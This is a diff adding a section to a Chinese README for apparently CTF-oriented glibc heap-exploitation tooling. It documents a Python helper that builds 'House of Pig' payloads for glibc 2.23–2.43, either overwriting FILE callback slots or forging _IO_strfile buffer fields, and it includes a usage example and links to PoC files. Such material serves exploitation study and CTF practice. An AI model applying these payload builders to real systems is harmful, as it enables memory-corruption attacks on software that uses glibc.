@@ -88,6 +88,116 @@ memset(new_buf + old_blen, 0, new_size - old_blen);
 
 现代 C 文件末尾分别整理经典 hook 窗口、PLUS 构建检查和 2.42～2.43 替代投递伪代码；可执行主体只承诺真实扩容数据流。
 
+## Python 离线板子
+
+[`pig.py`](./pig.py) 提供两个函数：
+
+```text
+build_house_of_pig         -> 返回扩容计划 PigPlan
+build_house_of_pig_payload -> 返回可直接投递的 MemoryWrite 写入
+```
+
+### 函数用途
+
+```text
+计算扩容时的 new_size = 2 * old_blen + 100
+按版本区分旧式回调槽和现代直接 malloc/memcpy/free 数据流
+```
+
+### 对应 PoC
+
+- [`poc_legacy_callbacks_2.23_2.27.c`](./poc_legacy_callbacks_2.23_2.27.c)：2.23～2.27 消费 `FILE+0xe0` 的 `_allocate_buffer` 与 `FILE+0xe8` 的 `_free_buffer`；
+- [`poc_str_overflow_sink_2.28_2.43.c`](./poc_str_overflow_sink_2.28_2.43.c)：2.28+ 直接执行 `malloc(new_size)`、`memcpy`、`free(old)`、`memset`。
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.23`～`2.43`。 |
+| `old_buffer_addr` | 扩容前 `_IO_buf_base`，即旧缓冲区地址。 |
+| `old_length` | 旧缓冲区长度 `_IO_buf_end - _IO_buf_base`，必须大于 0。 |
+| `stream_addr` | `_IO_strfile` 对象地址。仅 2.23～2.27 必须提供，用于计算旧式回调槽；2.28+ 可省略。 |
+
+### 返回对象 `PigPlan`
+
+| 字段 | 含义 |
+|---|---|
+| `old_buffer_addr` | 传入的旧缓冲区地址。 |
+| `old_length` | 传入的旧长度。 |
+| `new_size` | `2 * old_length + 100`，即扩容后申请的大小。 |
+| `allocate_slot_addr` | 2.23～2.27 为 `stream_addr + 0xe0`；2.28+ 为 `None`。 |
+| `free_slot_addr` | 2.23～2.27 为 `stream_addr + 0xe8`；2.28+ 为 `None`。 |
+
+### 返回对象 `PigPayload`
+
+| 字段 | 含义 |
+|---|---|
+| `plan` | 上面的 `PigPlan`。 |
+| `writes` | `MemoryWrite` 元组，是真正可交给题目写原语的 payload。 |
+
+`build_house_of_pig_payload` 的 `writes`：
+
+```text
+2.23～2.27:
+    stream_addr + 0xe0 -> allocate_callback_addr
+    stream_addr + 0xe8 -> free_callback_addr
+
+2.28～2.43:
+    stream_addr 处写 0x48 字节 FILE 字段镜像：
+        _IO_read_base/_ptr/_end  = old_buffer_addr
+        _IO_write_base           = old_buffer_addr
+        _IO_write_ptr/_end       = old_buffer_addr + old_length
+        _IO_buf_base             = old_buffer_addr
+        _IO_buf_end              = old_buffer_addr + old_length
+```
+
+### 最小使用示例
+
+```python
+from pig import build_house_of_pig, build_house_of_pig_payload
+
+# 2.28+：直接 malloc/memcpy/free 数据流，并生成触发扩容分支的 FILE 字段镜像
+payload = build_house_of_pig_payload(
+    version="2.35",
+    stream_addr=0x200000,
+    old_buffer_addr=0x300000,   # 旧 _IO_buf_base
+    old_length=0x40,            # old_blen
+)
+print(payload.plan.new_size)     # 2 * 0x40 + 100 = 0xe4
+for w in payload.writes:
+    print(w.label, hex(w.address), w.data.hex())
+
+# 2.23～2.27：需要 stream_addr，返回旧回调槽
+payload = build_house_of_pig_payload(
+    version="2.27",
+    old_buffer_addr=0x300000,
+    old_length=0x40,
+    stream_addr=0x200000,       # _IO_strfile 对象
+    allocate_callback_addr=0x401000,
+    free_callback_addr=0x402000,
+)
+for w in payload.writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 调用者必须提供
+
+```text
+可被 _IO_str_overflow 消费的 memstream/_IO_strfile 对象
+能触发 overflow 的 write_ptr == write_end 条件
+2.28+ 控制内部 malloc 返回位置所需的堆原语
+2.23～2.27 覆盖 FILE+0xe0/0xe8 回调槽的能力
+```
+
+### 函数不负责
+
+```text
+不生成完整 payload
+不负责 malloc 投递到 __free_hook / GOT / setcontext
+不处理 PLUS 分支的 IFUNC/GOT、RELRO 和 gadget 约束
+```
+
+
 ## 迁移与调试
 
 1. 先确认投递路径和最终触发点在目标 Build ID 中都存在。
